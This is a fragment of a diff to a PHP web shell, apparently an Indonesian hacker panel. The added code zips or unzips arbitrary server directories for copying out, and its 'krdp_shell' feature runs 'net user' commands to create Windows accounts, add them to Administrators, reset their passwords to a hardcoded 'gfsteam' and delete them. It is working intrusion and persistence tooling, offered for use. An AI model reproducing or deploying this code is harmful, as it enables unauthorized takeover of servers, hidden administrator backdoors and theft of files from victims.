+<input type='text' name='save' value='$dir/zakir_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='Backup!' style='width: 215px;'></form>";
+if($_POST['backup']){
+    $save=$_POST['save'];
+    function Zip($source, $destination){
+        if (extension_loaded('zip') === true)
+        {
+            if (file_exists($source) === true)
+            {
+                $zip = new ZipArchive();
+                if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
+                {
+                    $source = realpath($source);
+                    if (is_dir($source) === true)
+                    {
+                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
+                        foreach ($files as $file)
+                        {
+                            $file = realpath($file);
+                            if (is_dir($file) === true)
+                            {
+                                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+                            }
+                            else if (is_file($file) === true)
+                            {
+                                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
+                            }
+                        }
+                    }
+                    else if (is_file($source) === true)
+                    {
+                        $zip->addFromString(basename($source), file_get_contents($source));
+                    }
+                }
+                return $zip->close();
+            }
+        }
+        return false;
+    }
+    Zip($_POST['dir'],$save);
+    echo "Done , Save To <b>$save</b>";
+}
+echo "</tr><hr><tr><h2>Unzip Manual</h2>
+<form action='' method='post'>
+<font style='text-decoration: underline;'>Zip Location:</font><br>
+<input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br>
+<font style='text-decoration: underline;'>Save To:</font><br>
+<input type='text' name='save' value='$dir/Zak_unzip' style='width: 450px;' height='10'><br>
+<input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
+if($_POST['extrak']){
+    $save=$_POST['save'];
+    $zip = new ZipArchive;
+    $res = $zip->open($_POST['dir']);
+    if ($res === TRUE) {
+        $zip->extractTo($save);
+        $zip->close();
+    echo 'Succes, Location : <b>'.$save.'</b>';
+    } else {
+        echo 'Failed';
+    }
+}
+echo '</tr></table>';
+} elseif($_GET['do'] == 'krdp_shell') {
     if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
         if($_POST['create']) {
             $user = htmlspecialchars($_POST['user']);
             $pass = htmlspecialchars($_POST['pass']);
             if(preg_match("/$user/", exe("net user"))) {
-                echo "[INFO] -> <font color=red>user <font color=blue>$user</font> sudah ada</font>";
+                echo "[INFO] -> <font color=red>user <font color=cyan>$user</font> sudah ada</font>";
             } else {
                 $add_user   = exe("net user $user $pass /add");
                 $add_groups1 = exe("net localgroup Administrators $user /add");
@@ -6155,24 +6413,24 @@ elseif($_GET['do'] == 'krdp_shell') {
                 $add_groups3 = exe("net localgroup Administrateur $user /add");
                 echo "[ RDP ACCOUNT INFO ]<br>
                 ------------------------------<br>
-                IP: <font color=blue>".$ip."</font><br>
-                Username: <font color=blue>$user</font><br>
-                Password: <font color=blue>$pass</font><br>
+                IP: <font color=cyan>".$ip."</font><br>
+                Username: <font color=cyan>$user</font><br>
+                Password: <font color=cyan>$pass</font><br>
                 ------------------------------<br><br>
                 [ STATUS ]<br>
                 ------------------------------<br>
                 ";
                 if($add_user) {
-                    echo "[add user] -> <font color='blue'>Berhasil</font><br>";
+                    echo "[add user] -> <font color='cyan'>Berhasil</font><br>";
                 } else {
-                    echo "[add user] -> <font color='red'>Gagal</font><br>";
+                    echo "[add user] -> <font color='cyan'>Gagal</font><br>";
                 }
                 if($add_groups1) {
-                    echo "[add localgroup Administrators] -> <font color='blue'>Berhasil</font><br>";
+                    echo "[add localgroup Administrators] -> <font color='cyan'>Berhasil</font><br>";
                 } elseif($add_groups2) {
-                    echo "[add localgroup Administrator] -> <font color='blue'>Berhasil</font><br>";
+                    echo "[add localgroup Administrator] -> <font color='cyan'>Berhasil</font><br>";
                 } elseif($add_groups3) {
-                    echo "[add localgroup Administrateur] -> <font color='blue'>Berhasil</font><br>";
+                    echo "[add localgroup Administrateur] -> <font color='cyan'>Berhasil</font><br>";
                 } else {
                     echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                 }
@@ -6182,37 +6440,37 @@ elseif($_GET['do'] == 'krdp_shell') {
             $user = htmlspecialchars($_POST['r_user']);
             if($_POST['opsi'] == '1') {
                 $cek = exe("net user $user");
-                echo "Checking username <font color=blue>$user</font> ....... ";
+                echo "Checking username <font color=cyan>$user</font> ....... ";
                 if(preg_match("/$user/", $cek)) {
-                    echo "[ <font color=blue>Sudah ada</font> ]<br>
+                    echo "[ <font color=cyan>Sudah ada</font> ]<br>
                     ------------------------------<br><br>
                     <pre>$cek</pre>";
                 } else {
                     echo "[ <font color=red>belum ada</font> ]";
                 }
             } elseif($_POST['opsi'] == '2') {
-                $cek = exe("net user $user global");
+                $cek = exe("net user $user gfsteam");
                 if(preg_match("/$user/", exe("net user"))) {
-                    echo "[change password: <font color=blue>global</font>] -> ";
+                    echo "[change password: <font color=cyan>gfsteam</font>] -> ";
                     if($cek) {
-                        echo "<font color=blue>Berhasil</font>";
+                        echo "<font color=cyan>Berhasil</font>";
                     } else {
                         echo "<font color=red>Gagal</font>";
                     }
                 } else {
-                    echo "[INFO] -> <font color=red>user <font color=blue>$user</font> belum ada</font>";
+                    echo "[INFO] -> <font color=red>user <font color=cyan>$user</font> belum ada</font>";
                 }
             } elseif($_POST['opsi'] == '3') {
                 $cek = exe("net user $user /DELETE");
                 if(preg_match("/$user/", exe("net user"))) {
-                    echo "[remove user: <font color=blue>$user</font>] -> ";
+                    echo "[remove user: <font color=cyan>$user</font>] -> ";
                     if($cek) {
-                        echo "<font color=blue>Berhasil</font>";
+                        echo "<font color=cyan>Berhasil</font>";
                     } else {
                         echo "<font color=red>Gagal</font>";
                     }
                 } else {
-                    echo "[INFO] -> <font color=red>user <font color=blue>$user</font> belum ada</font>";
+                    echo "[INFO] -> <font color=red>user <font color=cyan>$user</font> belum ada</font>";
                 }
             } else {
                 //
@@ -6220,8 +6478,8 @@ elseif($_GET['do'] == 'krdp_shell') {
         } else {
             echo "-- Create RDP --<br>
             <form method='post'>
-            <input type='text' name='user' placeholder='username' value='global' required>
-            <input type='text' name='pass' placeholder='password' value='global' required>
+            <input type='text' name='user' placeholder='username' value='gfsteam' required>
+            <input type='text' name='pass' placeholder='password' value='gfsteam' required>
             <input type='submit' name='create' value='>>'>
             </form>
             -- Option --<br>
@@ -6239,7 +6497,11 @@ elseif($_GET['do'] == 'krdp_shell') {
     } else {
         echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
     }
-} elseif($_GET['act'] == 'newfile') {
+} 
+
+
+
+elseif($_GET['act'] == 'newfile') {
     if($_POST['new_save_file']) {
         $newfile = htmlspecialchars($_POST['newfile']);
         $fopen = fopen($newfile, "a+");
